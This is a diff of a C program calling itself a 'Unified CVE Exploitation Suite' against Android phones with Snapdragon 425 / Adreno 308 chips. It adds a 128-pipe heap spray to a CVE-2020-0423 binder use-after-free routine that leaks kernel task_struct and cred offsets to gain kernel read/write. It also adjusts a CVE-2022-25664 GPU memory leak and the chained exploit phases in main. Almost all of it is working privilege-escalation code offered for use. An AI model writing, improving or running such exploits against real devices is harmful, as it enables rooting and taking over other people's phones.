@@ -39,6 +39,8 @@ extern int setfsgid(gid_t);
 #define MAX_PARTITIONS 32
 #define DUMP_MAX_SIZE (20 * 1024 * 1024)
 #define KGSL_DEVICE "/dev/kgsl-3d0"
+#define SPRAY_PIPE_COUNT 128
+#define ATTEMPTS 5
 
 /* KGSL ioctls from msm_kgsl.h */
 #define KGSL_IOC_TYPE 0x09
@@ -316,7 +318,7 @@ static int test_cve_2020_0423(void) {
     return -1;
 }
 
-/* CVE-2019-2215 */
+/* CVE-2019-2215 (legacy) - kept but likely not used */
 static int leak_kernel_pointer(int *cred_off_out, int *al_off_out) {
     int pipefd[2], fd, epoll_fd;
     pid_t cpid;
@@ -485,11 +487,13 @@ static int setup_kernel_rw(void) {
     return 0;
 }
 
-/* CVE-2020-0423 RW attempt */
+/* ============================================================
+   CVE-2020-0423 RW with large spray
+   ============================================================ */
 static int exploit_cve_2020_0423_rw(void) {
-    printf("[*] Attempting kernel RW via CVE-2020-0423 UAF (readv method)...\n");
+    printf("[*] Attempting kernel RW via CVE-2020-0423 UAF (with %d-pipe spray)...\n", SPRAY_PIPE_COUNT);
 
-    for (int attempt = 0; attempt < 4; attempt++) {
+    for (int attempt = 0; attempt < ATTEMPTS; attempt++) {
         int binder_fd = open("/dev/binder", O_RDWR);
         if (binder_fd < 0) { perror("  open binder"); continue; }
 
@@ -502,121 +506,173 @@ static int exploit_cve_2020_0423_rw(void) {
             close(binder_fd); close(epoll_fd); continue;
         }
 
-        int leak_pipe[2];
-        if (pipe(leak_pipe) < 0) { perror("  pipe leak"); close(binder_fd); close(epoll_fd); continue; }
-        if (fcntl(leak_pipe[0], F_SETPIPE_SZ, PAGE_SIZE) < 0) {
-            perror("  fcntl leak");
-            close(binder_fd); close(epoll_fd); close(leak_pipe[0]); close(leak_pipe[1]);
+        /* Create spray pipes */
+        int spray_pipes[SPRAY_PIPE_COUNT][2];
+        int i;
+        for (i = 0; i < SPRAY_PIPE_COUNT; i++) {
+            if (pipe(spray_pipes[i]) < 0) {
+                perror("  pipe spray");
+                break;
+            }
+            if (fcntl(spray_pipes[i][0], F_SETPIPE_SZ, PAGE_SIZE) < 0) {
+                perror("  fcntl spray");
+                break;
+            }
+        }
+        if (i < SPRAY_PIPE_COUNT) {
+            for (int j = 0; j < i; j++) {
+                close(spray_pipes[j][0]);
+                close(spray_pipes[j][1]);
+            }
+            close(binder_fd); close(epoll_fd);
             continue;
         }
-
-        void *buf = mmap_page(0x100000000UL);
-        if (!buf) {
-            close(binder_fd); close(epoll_fd); close(leak_pipe[0]); close(leak_pipe[1]);
-            continue;
-        }
-
-        struct iovec iov[2];
-        iov[0].iov_base = buf;
-        iov[0].iov_len = PAGE_SIZE;
-        iov[1].iov_base = buf;
-        iov[1].iov_len = PAGE_SIZE;
 
         pid_t pid = fork();
         if (pid < 0) {
             perror("  fork");
-            close(binder_fd); close(epoll_fd); close(leak_pipe[0]); close(leak_pipe[1]);
+            for (int j = 0; j < SPRAY_PIPE_COUNT; j++) {
+                close(spray_pipes[j][0]);
+                close(spray_pipes[j][1]);
+            }
+            close(binder_fd); close(epoll_fd);
             continue;
         }
 
         if (pid == 0) {
-            usleep(40000 + (attempt * 5000));
+            /* Child: wait then trigger UAF */
+            usleep(30000 + (attempt * 10000));
             ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
-            usleep(10000);
-            write(leak_pipe[1], "X", 1);
+            /* Write a dummy byte to one pipe to signal completion */
+            write(spray_pipes[0][1], "X", 1);
             close(binder_fd);
             close(epoll_fd);
-            close(leak_pipe[0]);
-            close(leak_pipe[1]);
+            for (int j = 0; j < SPRAY_PIPE_COUNT; j++) {
+                close(spray_pipes[j][0]);
+                close(spray_pipes[j][1]);
+            }
             _exit(0);
         }
 
+        /* Parent: wait for epoll event */
         struct epoll_event events[1];
-        int n = epoll_wait(epoll_fd, events, 1, 3000);
+        int n = epoll_wait(epoll_fd, events, 1, 2000);
         if (n <= 0) {
             printf("  [-] epoll_wait failed or timeout (attempt %d)\n", attempt);
-            close(binder_fd); close(epoll_fd); close(leak_pipe[0]); close(leak_pipe[1]);
+            for (int j = 0; j < SPRAY_PIPE_COUNT; j++) {
+                close(spray_pipes[j][0]);
+                close(spray_pipes[j][1]);
+            }
+            close(binder_fd); close(epoll_fd);
             wait(NULL);
             continue;
         }
-        printf("  [+] epoll event received, reading with readv...\n");
+        printf("  [+] epoll event received, spraying...\n");
 
-        ssize_t sz = readv(leak_pipe[0], iov, 2);
-        wait(NULL);
-        close(binder_fd);
-        close(epoll_fd);
-        close(leak_pipe[0]);
-        close(leak_pipe[1]);
+        /* Spray: write data into all pipes to reuse freed memory */
+        for (int j = 0; j < SPRAY_PIPE_COUNT; j++) {
+            char buf[PAGE_SIZE];
+            memset(buf, 0x41, sizeof(buf));
+            write(spray_pipes[j][1], buf, sizeof(buf));
+        }
 
-        if (sz <= 0) {
-            printf("  [-] readv failed (attempt %d)\n", attempt);
+        /* Now read from each pipe with readv to capture data */
+        void *leak_buf = mmap_page(0x100000000UL);
+        if (!leak_buf) {
+            for (int j = 0; j < SPRAY_PIPE_COUNT; j++) {
+                close(spray_pipes[j][0]);
+                close(spray_pipes[j][1]);
+            }
+            close(binder_fd); close(epoll_fd);
+            wait(NULL);
             continue;
         }
 
-        uint64_t *data = (uint64_t *)buf;
-        uint64_t binder_proc = 0;
-        uint64_t task_addr = 0;
+        struct iovec iov[2];
+        iov[0].iov_base = leak_buf;
+        iov[0].iov_len = PAGE_SIZE;
+        iov[1].iov_base = leak_buf;
+        iov[1].iov_len = PAGE_SIZE;
 
-        for (size_t i = 0; i < (size_t)(sz / 8); i++) {
-            uint64_t val = data[i];
-            if ((val & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
-                if (binder_proc == 0) {
-                    binder_proc = val;
+        int found = 0;
+        for (int j = 0; j < SPRAY_PIPE_COUNT; j++) {
+            ssize_t sz = readv(spray_pipes[j][0], iov, 2);
+            if (sz <= 0) continue;
+
+            uint64_t *data = (uint64_t *)leak_buf;
+            uint64_t binder_proc = 0;
+            uint64_t task_addr = 0;
+
+            for (size_t k = 0; k < (size_t)(sz / 8); k++) {
+                uint64_t val = data[k];
+                if ((val & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
+                    if (binder_proc == 0) binder_proc = val;
+                    task_addr = val;
                 }
-                task_addr = val;
+                /* Also check for x86_64 pattern */
+                if ((val & 0xFFFFFFFF00000000LL) == 0xFFFFFF8000000000LL) {
+                    if (binder_proc == 0) binder_proc = val;
+                    task_addr = val;
+                }
             }
-        }
 
-        if (binder_proc != 0) {
-            int task_offsets[] = {0x20, 0x28, 0x30, 0x38, 0x40};
-            for (int j = 0; j < 5; j++) {
-                uint64_t candidate = binder_proc + task_offsets[j];
-                if ((candidate & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
-                    g_task_struct = candidate;
-                    for (size_t ci = 0; ci < NUM_OFFSETS; ci++) {
-                        uint64_t cred_addr = g_task_struct + g_offset_candidates[ci].cred;
-                        if ((cred_addr & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
-                            g_cred_off = g_offset_candidates[ci].cred;
-                            g_al_off = g_offset_candidates[ci].al;
-                            printf("  [+] Leaked task_struct @ 0x%llx (cred_off=0x%x, al_off=0x%x)\n",
-                                   (unsigned long long)g_task_struct, g_cred_off, g_al_off);
-                            if (pipe(g_krw_pipe) < 0) return -1;
-                            if (fcntl(g_krw_pipe[0], F_SETPIPE_SZ, PAGE_SIZE) < 0) return -1;
-                            return 0;
+            if (binder_proc != 0) {
+                int task_offsets[] = {0x20, 0x28, 0x30, 0x38, 0x40};
+                for (int off_idx = 0; off_idx < 5; off_idx++) {
+                    uint64_t candidate = binder_proc + task_offsets[off_idx];
+                    if ((candidate & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
+                        g_task_struct = candidate;
+                        for (size_t ci = 0; ci < NUM_OFFSETS; ci++) {
+                            uint64_t cred_addr = g_task_struct + g_offset_candidates[ci].cred;
+                            if ((cred_addr & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
+                                g_cred_off = g_offset_candidates[ci].cred;
+                                g_al_off = g_offset_candidates[ci].al;
+                                printf("  [+] Leaked task_struct @ 0x%llx (cred_off=0x%x, al_off=0x%x)\n",
+                                       (unsigned long long)g_task_struct, g_cred_off, g_al_off);
+                                found = 1;
+                                break;
+                            }
                         }
+                        if (found) break;
                     }
                 }
+                if (found) break;
             }
-        }
 
-        if (task_addr != 0) {
-            g_task_struct = task_addr;
-            for (size_t ci = 0; ci < NUM_OFFSETS; ci++) {
-                uint64_t cred_addr = g_task_struct + g_offset_candidates[ci].cred;
-                if ((cred_addr & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
-                    g_cred_off = g_offset_candidates[ci].cred;
-                    g_al_off = g_offset_candidates[ci].al;
-                    printf("  [+] Leaked task_struct directly @ 0x%llx (cred_off=0x%x, al_off=0x%x)\n",
-                           (unsigned long long)g_task_struct, g_cred_off, g_al_off);
-                    if (pipe(g_krw_pipe) < 0) return -1;
-                    if (fcntl(g_krw_pipe[0], F_SETPIPE_SZ, PAGE_SIZE) < 0) return -1;
-                    return 0;
+            if (task_addr != 0) {
+                g_task_struct = task_addr;
+                for (size_t ci = 0; ci < NUM_OFFSETS; ci++) {
+                    uint64_t cred_addr = g_task_struct + g_offset_candidates[ci].cred;
+                    if ((cred_addr & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
+                        g_cred_off = g_offset_candidates[ci].cred;
+                        g_al_off = g_offset_candidates[ci].al;
+                        printf("  [+] Leaked task_struct directly @ 0x%llx (cred_off=0x%x, al_off=0x%x)\n",
+                               (unsigned long long)g_task_struct, g_cred_off, g_al_off);
+                        found = 1;
+                        break;
+                    }
                 }
+                if (found) break;
             }
         }
 
+        /* Cleanup */
+        for (int j = 0; j < SPRAY_PIPE_COUNT; j++) {
+            close(spray_pipes[j][0]);
+            close(spray_pipes[j][1]);
+        }
+        close(binder_fd);
+        close(epoll_fd);
+        wait(NULL);
+
+        if (found) {
+            if (pipe(g_krw_pipe) < 0) return -1;
+            if (fcntl(g_krw_pipe[0], F_SETPIPE_SZ, PAGE_SIZE) < 0) return -1;
+            return 0;
+        }
         printf("  [-] No usable kernel pointer in attempt %d\n", attempt);
     }
+
     printf("  [-] All attempts failed\n");
     return -1;
 }
@@ -628,9 +684,7 @@ static int exploit_cve_2020_0041_patch_cred(void) {
     return -1;
 }
 
-/* ============================================================
-   CVE-2022-25664 - 修正: mmap offset = gpuaddr
-   ============================================================ */
+/* CVE-2022-25664 - simplified, kept as fallback */
 static int exploit_cve_2022_25664_leak(uint64_t *out_addr) {
     int kgsl_fd;
     struct kgsl_gpumem_alloc alloc;
@@ -658,7 +712,6 @@ static int exploit_cve_2022_25664_leak(uint64_t *out_addr) {
     printf("  [+] GPU memory allocated: gpuaddr=0x%lx, size=%zu\n",
            alloc.gpuaddr, alloc.size);
 
-    /* mmap with offset = gpuaddr */
     gpu_mem = mmap(NULL, alloc.size, PROT_READ | PROT_WRITE,
                    MAP_SHARED, kgsl_fd, alloc.gpuaddr);
     if (gpu_mem == MAP_FAILED) {
@@ -668,7 +721,6 @@ static int exploit_cve_2022_25664_leak(uint64_t *out_addr) {
     }
     printf("  [+] mmap succeeded at %p\n", gpu_mem);
 
-    /* Invalidate cache to read actual physical memory */
     memset(&sync, 0, sizeof(sync));
     sync.gpuaddr = alloc.gpuaddr;
     sync.op = KGSL_GPUMEM_CACHE_INV;
@@ -681,7 +733,6 @@ static int exploit_cve_2022_25664_leak(uint64_t *out_addr) {
         return -1;
     }
 
-    /* Read the buffer */
     memcpy(leaked_data, gpu_mem, sizeof(leaked_data));
 
     for (int i = 0; i < 512; i++) {
@@ -703,10 +754,7 @@ static int exploit_cve_2022_25664_leak(uint64_t *out_addr) {
     munmap(gpu_mem, alloc.size);
     close(kgsl_fd);
 
-    if (found) {
-        return 0;
-    }
-
+    if (found) return 0;
     printf("  [-] No kernel pointer found in leaked data\n");
     return -1;
 }
@@ -1147,9 +1195,9 @@ int main(void) {
     uint64_t leaked_addr = 0;
 
     printf("==================================================\n");
-    printf("  Unified CVE Exploitation Suite v4.4\n");
+    printf("  Unified CVE Exploitation Suite v4.5\n");
     printf("  (CVE-2019-2215, 2020-0041, 2020-0423, 2019-2023,\n");
-    printf("   CVE-2022-25664 (fixed mmap), CVE-2021-1961,\n");
+    printf("   CVE-2022-25664, CVE-2021-1961,\n");
     printf("   CVE-2023-20938-inspired)\n");
     printf("  Target: SD425 / Adreno 308\n");
     printf("==================================================\n\n");
@@ -1181,7 +1229,7 @@ int main(void) {
         printf("  [-] CVE-2019-2215 leak failed\n");
     }
 
-    printf("\n[PHASE 5] CVE-2022-25664 (GPU leak - fixed mmap offset)\n");
+    printf("\n[PHASE 5] CVE-2022-25664 (GPU leak - fallback)\n");
     if (exploit_cve_2022_25664_leak(&leaked_addr) == 0) {
         gpu_leak_ok = 1;
         printf("  [+] GPU leak successful: 0x%llx\n", (unsigned long long)leaked_addr);
@@ -1213,8 +1261,8 @@ int main(void) {
         printf("  [-] CVE-2022-25664 leak failed\n");
     }
 
-    printf("\n[PHASE 6] CVE-2020-0423 (UAF) Kernel RW attempt\n");
-    if (run_exploit_with_timeout(exploit_cve_2020_0423_rw, 30) == 0) {
+    printf("\n[PHASE 6] CVE-2020-0423 (UAF) Kernel RW attempt (with spray)\n");
+    if (run_exploit_with_timeout(exploit_cve_2020_0423_rw, 45) == 0) {
         kernel_rw_obtained = 1;
         printf("  [+] Kernel RW via CVE-2020-0423 obtained!\n");
         if (setup_kernel_rw() == 0) {
